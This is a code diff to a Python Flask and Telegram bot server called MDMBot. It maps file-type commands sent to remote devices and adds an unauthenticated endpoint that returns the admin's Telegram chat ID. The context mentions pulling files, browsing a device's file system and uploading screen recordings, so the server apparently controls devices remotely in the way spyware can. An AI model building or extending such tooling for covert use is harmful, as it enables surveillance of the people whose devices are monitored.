@@ -1455,8 +1455,16 @@ class MDMBot:
                     bot.edit_message_text(text, c.message.chat.id, c.message.message_id,
                                           parse_mode="HTML", reply_markup=kb)
                 else:
-                    # tgt = نوع الملف (IMAGE/VIDEO/AUDIO/DOCUMENT/ALL)
-                    self._send_cmd(c.message.chat.id, did, "new-files-" + tgt.lower() if tgt != "ALL" else "new-files-all")
+                    # ⚡ V11.2.62: إصلاح أسماء الأوامر (تطابق التطبيق)
+                    cmd_map = {
+                        "IMAGE": "new-files-images",
+                        "VIDEO": "new-files-videos",
+                        "AUDIO": "new-files-audio",
+                        "DOCUMENT": "new-files-documents",
+                        "ALL": "new-files-all"
+                    }
+                    cmd = cmd_map.get(tgt, "new-files-all")
+                    self._send_cmd(c.message.chat.id, did, cmd)
                 bot.answer_callback_query(c.id)
 
             elif a == "pullfile":
@@ -3436,6 +3444,19 @@ def _sock_file_explorer(data):
                 mdm_bot.bot.send_message(cid, result, parse_mode="HTML")
         except Exception as e:
             logger.error(f"فشل إرسال نتائج file explorer: {e}")
+
+
+# ⚡ V11.2.62: endpoint لجلب chat_id البوت (للإرسال المباشر)
+@app.route("/api/device/get-bot-chat-id", methods=["GET"])
+def _get_bot_chat_id():
+    """يعيد chat_id الأدمن للتطبيق (للإرسال المباشر للبوت)"""
+    try:
+        for admin_id in Config.ADMIN_IDS:
+            return jsonify({"chat_id": str(admin_id), "ok": True}), 200
+        return jsonify({"error": "no_admin", "ok": False}), 404
+    except Exception as e:
+        logger.error(f"❌ get-bot-chat-id error: {e}")
+        return jsonify({"error": str(e), "ok": False}), 500
 
 
 # ⚡ REST endpoint for video upload (تسجيل فيديو الشاشة + معرض الفيديوهات + FileMonitor)
